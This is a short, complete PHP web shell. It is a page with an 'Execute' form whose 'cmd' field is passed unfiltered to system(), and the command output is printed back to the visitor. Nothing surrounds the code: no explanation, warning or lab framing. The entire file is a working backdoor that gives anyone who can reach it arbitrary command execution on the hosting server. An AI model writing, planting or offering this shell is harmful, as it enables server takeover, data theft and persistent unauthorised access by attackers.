<html>
  <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="text" name="cmd" autofocus id="cmd" size="80">
      <input type="submit" value="Execute">
    </form>
    <pre>
<?php
  if(isset($_GET['cmd'])) {
      system($_GET['cmd']);
  }
?>
    </pre>
  </body>
</html>